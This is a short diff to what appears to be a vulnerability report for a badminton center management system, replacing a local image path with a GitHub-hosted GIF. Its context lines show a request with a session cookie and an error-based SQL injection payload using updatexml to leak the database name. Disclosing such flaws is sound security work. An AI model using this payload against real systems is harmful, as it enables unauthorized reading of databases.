@@ -30,4 +30,4 @@ Cookie: PHPSESSID=4gth9auqof3f53e4gedjm3dct2
 id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
 ```
 
-![](D:\桌面\动画.gif)
+![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)
